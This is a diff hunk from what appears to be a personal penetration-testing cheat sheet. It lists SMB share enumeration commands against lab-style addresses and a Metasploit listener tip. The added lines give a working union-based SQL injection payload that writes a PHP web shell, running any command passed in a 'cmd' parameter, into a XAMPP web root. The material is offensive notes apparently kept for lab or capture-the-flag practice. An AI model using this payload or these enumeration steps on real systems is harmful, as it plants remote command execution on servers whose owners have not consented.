@@ -83,6 +83,9 @@ smbclient \\\\10.10.10.178\\IPC$ #Accessing share
 smbclient \\\\10.10.10.178\\Users -U TempUser #Accessing share with username
 smbmap -R -H 10.10.10.123 #smbmap to enumerate share permissions
 
+Adding a php rce file using union based sqli: 
+' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'
+
 
 exploit -j #for runnung a listner in background in msfconsole
 
